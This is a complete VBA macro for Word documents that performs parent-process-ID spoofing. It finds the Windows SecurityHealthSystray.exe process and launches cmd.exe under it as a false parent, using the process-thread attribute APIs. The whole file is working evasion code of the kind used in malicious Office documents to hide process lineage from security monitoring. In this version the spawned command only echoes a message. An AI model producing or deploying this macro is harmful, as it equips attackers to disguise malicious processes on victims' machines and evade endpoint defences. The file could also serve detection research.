Option Explicit

' PPID Spoofing macro for Word .doc files.
' Finds SecurityHealthSystray.exe, creates cmd.exe with it as spoofed parent.
' Requires: WinAPI_Core.bas imported into the same VBA project.
' Paste into a standard module.

' --- Constants not in WinAPI_Core ---
Private Const EXTENDED_STARTUPINFO_PRESENT As Long = &H80000
Private Const CREATE_SUSPENDED As Long = &H4
Private Const CREATE_NEW_CONSOLE As Long = &H10
Private Const PROCESS_CREATE_PROCESS As Long = &H80
Private Const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS As Long = &H20000
Private Const HEAP_ZERO_MEMORY As Long = &H8

#If Win64 Then
    Private Const HANDLE_SIZE As Long = 8
#Else
    Private Const HANDLE_SIZE As Long = 4
#End If

' --- Extended startup info (base STARTUPINFO comes from WinAPI_Core) ---
Private Type STARTUPINFOEX
    si As STARTUPINFO
    lpAttributeList As LongPtr
End Type

' --- Declares not in WinAPI_Core ---
Private Declare PtrSafe Function InitializeProcThreadAttributeList Lib "kernel32" ( _
    ByVal lpAttributeList As LongPtr, ByVal dwAttributeCount As Long, _
    ByVal dwFlags As Long, ByRef lpSize As LongPtr) As Long
Private Declare PtrSafe Function UpdateProcThreadAttribute Lib "kernel32" ( _
    ByVal lpAttributeList As LongPtr, ByVal dwFlags As Long, _
    ByVal dwAttribute As LongPtr, ByVal lpValue As LongPtr, _
    ByVal cbSize As LongPtr, ByVal lpPreviousValue As LongPtr, _
    ByVal lpReturnSize As LongPtr) As Long
Private Declare PtrSafe Sub DeleteProcThreadAttributeList Lib "kernel32" ( _
    ByVal lpAttributeList As LongPtr)
Private Declare PtrSafe Function HeapAlloc Lib "kernel32" ( _
    ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
Private Declare PtrSafe Function HeapFree Lib "kernel32" ( _
    ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal lpMem As LongPtr) As Long
Private Declare PtrSafe Function GetProcessHeap Lib "kernel32" () As LongPtr
Private Declare PtrSafe Function ResumeThread Lib "kernel32" (ByVal hThread As LongPtr) As Long
' Aliased to avoid collision with WinAPI_Core's CreateProcessW (takes STARTUPINFO)
Private Declare PtrSafe Function CreateProcessExW Lib "kernel32" Alias "CreateProcessW" ( _
    ByVal lpApplicationName As LongPtr, ByVal lpCommandLine As LongPtr, _
    ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, _
    ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As LongPtr, _
    ByRef lpStartupInfo As STARTUPINFOEX, _
    ByRef lpProcessInformation As PROCESS_INFORMATION) As Long

' ===================== IMPLEMENTATION =====================

Private Function GetPidByName(ByVal processName As String) As Long
    Dim wmi As Object, procs As Object, proc As Object
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='" & _
                               Replace(processName, "'", "''") & "'")
    For Each proc In procs
        GetPidByName = CLng(proc.ProcessId)
        Exit Function
    Next
End Function

Private Function CreateSpoofedProcess( _
    ByVal hParentProcess As LongPtr, _
    ByVal cmdLine As String, _
    ByRef pi As PROCESS_INFORMATION) As Boolean

    Dim siEx As STARTUPINFOEX
    Dim listSize As LongPtr
    Dim pAttrList As LongPtr
    Dim attrInitialized As Boolean
    Dim hParentLocal As LongPtr

    hParentLocal = hParentProcess

    InitializeProcThreadAttributeList 0, 1, 0, listSize
    If listSize = 0 Then
        Debug.Print "[!] Attribute list size query failed: " & Err.LastDllError
        GoTo Cleanup
    End If

    pAttrList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, listSize)
    If pAttrList = 0 Then GoTo Cleanup

    If InitializeProcThreadAttributeList(pAttrList, 1, 0, listSize) = 0 Then
        Debug.Print "[!] InitializeProcThreadAttributeList failed: " & Err.LastDllError
        GoTo Cleanup
    End If
    attrInitialized = True

    If UpdateProcThreadAttribute(pAttrList, 0, _
            CLngPtr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS), _
            VarPtr(hParentLocal), CLngPtr(HANDLE_SIZE), 0, 0) = 0 Then
        Debug.Print "[!] UpdateProcThreadAttribute failed: " & Err.LastDllError
        GoTo Cleanup
    End If

    siEx.si.cb = LenB(siEx)
    siEx.si.dwFlags = STARTF_USESHOWWINDOW
    siEx.si.wShowWindow = SW_SHOW
    siEx.lpAttributeList = pAttrList

    If CreateProcessExW(0, StrPtr(cmdLine), 0, 0, 0, _
            EXTENDED_STARTUPINFO_PRESENT Or CREATE_NEW_CONSOLE Or CREATE_SUSPENDED, _
            0, 0, siEx, pi) = 0 Then
        Debug.Print "[!] CreateProcessW failed: " & Err.LastDllError
        GoTo Cleanup
    End If

    CreateSpoofedProcess = True

Cleanup:
    If pAttrList <> 0 Then
        If attrInitialized Then DeleteProcThreadAttributeList pAttrList
        HeapFree GetProcessHeap(), 0, pAttrList
    End If
End Function

' ===================== ENTRY POINT =====================

Public Sub Run()
    Const PARENT_NAME As String = "SecurityHealthSystray.exe"

    Dim parentPid As Long
    parentPid = GetPidByName(PARENT_NAME)
    If parentPid = 0 Then
        MsgBox PARENT_NAME & " not found.", vbExclamation
        Exit Sub
    End If

    Dim hParent As LongPtr
    hParent = OpenProcess(PROCESS_CREATE_PROCESS, 0, parentPid)
    If hParent = 0 Then
        MsgBox "OpenProcess failed (error " & Err.LastDllError & ")", vbExclamation
        Exit Sub
    End If

    Dim pi As PROCESS_INFORMATION
    Dim cmdLine As String
    cmdLine = "C:\Windows\System32\cmd.exe /K echo PPID Spoofed from VBA! && pause"

    If CreateSpoofedProcess(hParent, cmdLine, pi) Then
        ResumeThread pi.hThread
        CloseHandle pi.hProcess
        CloseHandle pi.hThread
        MsgBox "PID " & pi.dwProcessId & " spawned under " & PARENT_NAME & _
               " (" & parentPid & ")", vbInformation, "PPID Spoof"
    Else
        MsgBox "Failed - Ctrl+G for details", vbExclamation
    End If

    CloseHandle hParent
End Sub
